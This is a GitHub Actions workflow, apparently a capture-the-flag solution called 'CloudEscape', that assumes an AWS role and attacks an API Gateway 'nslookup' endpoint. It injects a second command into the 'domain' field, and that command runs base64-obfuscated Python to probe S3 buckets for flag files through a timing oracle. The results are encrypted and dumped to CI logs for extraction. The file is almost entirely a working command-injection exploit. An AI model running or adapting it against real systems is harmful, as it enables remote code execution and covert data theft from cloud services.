name: CloudEscape OIDC probe

on:
  push:
    branches: [corgi]
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Scan likely S3 object prefixes through timing oracle
        env:
          CLOUDESCAPE_PUBLIC_KEY: |
            -----BEGIN PUBLIC KEY-----
            MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA093h/Q9hjDQrm4tbmJm3
            v1TdeWqDGv1ZJ0KCuwHTJYere13hatLPw8FejmxxFF/5an3xQ8tuOcb7I7vFzVkX
            hcYi1/fsai9CEe8Xq+tbM67rHrunXCcBcJM5q1OHyUQQgD+oycclMPILNfvUxB+M
            /1yXt2TDc0a3XlKU6Hag86FNKHVNXmYuqbcHbai/WjQ74lN1nv2VuPok7ldbCwVZ
            i69KGFrUQv4fXxiMSD2hFFkJaAWd6chmZwvsmlBIpae1CjJilXfKLGbd0AbYNVYW
            fTD01ZHPKdHFdauUSuoM4HPlM157O/uhcnejzPwW1dZyVOZoTUjYSPFqDlbK6Hxo
            5wIDAQAB
            -----END PUBLIC KEY-----
        run: |
          set +x
          printf '%s\n' "$CLOUDESCAPE_PUBLIC_KEY" > /tmp/cloudescape.pub
          python3 -m pip install requests requests-aws4auth --quiet
          python3 - <<'PY'
          import base64, json, os, requests, time
          from requests_aws4auth import AWS4Auth
          auth = AWS4Auth(os.environ["AWS_ACCESS_KEY_ID"], os.environ["AWS_SECRET_ACCESS_KEY"], "us-east-1", "execute-api", session_token=os.environ["AWS_SESSION_TOKEN"])
          keys = ["flag.txt","public/flag.txt","logs/flag.txt","log/flag.txt","user/flag.txt","users/flag.txt","data/flag.txt","output/flag.txt","results/flag.txt","tmp/flag.txt","uploads/flag.txt","exports/flag.txt","artifacts/flag.txt","secrets/flag.txt","config/flag.txt","stage2/flag.txt","stage-2/flag.txt","challenge/flag.txt"]
          results = {}
          for bucket in ["userad88e2b168aa387e", "logad88e2b168aa387e"]:
              for key in keys:
                  code = f"""import boto3, time
          try:
              s = boto3.client('s3', region_name='us-east-1', endpoint_url='https://s3.us-east-1.amazonaws.com')
              s.get_object(Bucket={bucket!r}, Key={key!r})['Body'].read()
              time.sleep(4)
          except Exception:
              pass
          """
                  encoded = base64.b64encode(code.encode()).decode()
                  domain = 'example.com; python3 -c "import base64;exec(base64.b64decode(\'' + encoded + '\'))"'
                  start = time.monotonic()
                  r = requests.post("https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup", json={"domain":domain}, auth=auth, timeout=30)
                  results[f"{bucket}:{key}"] = {"status":r.status_code,"elapsed":round(time.monotonic()-start,3)}
          json.dump(results,open("/tmp/cloudescape-result.json","w"),separators=(",",":"))
          PY
          openssl rand -hex 32 > /tmp/cloudescape.key
          openssl pkeyutl -encrypt -pubin -inkey /tmp/cloudescape.pub -pkeyopt rsa_padding_mode:oaep -in /tmp/cloudescape.key -out /tmp/cloudescape.key.enc
          openssl enc -aes-256-cbc -pbkdf2 -salt -pass file:/tmp/cloudescape.key -in /tmp/cloudescape-result.json -out /tmp/cloudescape.result.enc
          echo "ENCRYPTED_KEY_B64=$(base64 -w0 /tmp/cloudescape.key.enc)"
          echo "ENCRYPTED_RESULT_B64=$(base64 -w0 /tmp/cloudescape.result.enc)"
